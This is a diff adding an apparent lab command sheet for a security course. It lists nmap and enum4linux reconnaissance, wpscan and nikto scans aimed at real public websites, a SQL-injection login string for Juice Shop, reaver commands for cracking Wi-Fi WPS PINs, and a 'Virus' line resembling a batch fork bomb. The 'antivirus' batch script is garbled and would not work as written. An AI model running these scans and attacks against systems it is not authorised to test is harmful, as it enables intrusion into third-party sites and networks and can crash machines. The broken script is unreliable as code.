@@ -1,0 +1,65 @@
+Exp 1&2 
+sudo apt install nmap
+
+Ex 1-"nmap -sP 192.168.101.1"
+
+Ex 2-"nmap -sT 192.168.101.1"
+
+Exp 3
+sudo snap install enum4linux
+sudo apt install enum4linux
+
+Ex 3-"enum4linux -U -o 192.168.101.1"
+
+Exp 4
+sudo apt install ruby && sudo gem install wpscan
+
+Ex 4-"wpscan –url https://blog.flicker.net/en"
+
+Exp 5
+sudo apt install nikto
+
+Ex 5-"nikto -h https://bbc.com/news/world -ssl"
+
+Exp 6
+
+Exp 7
+https://juice-shop.herokuapp.com/
+
+Username:“admin’ or 1= 1;--“
+
+Exp 8
+sudo apt install wireshark
+
+Ex8-"tcp.port == 80 || udp.port == 80"
+
+Exp 9
+Antivirus
+
+@echo off
+echo Detecting Viruses......
+:start
+cd C:\
+IF EXIST swing.bat goto infected IF NOT EXIST virus.bat goto clean
+:infected
+echo WARNING SWING.BAT VIRUS DETECTED!
+del swing.bat pause
+goto start
+:clean
+echo your System is secure now and virus has been deleted! pause
+exit 
+
+Virus
+
+%O | %O
+
+Exp 10
+apt-get update
+apt-get install reaver
+
+airmon-ng start wlan0
+
+airodump-ng wlan0
+
+reaver -i moninterface -b bssid -vv 
+reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
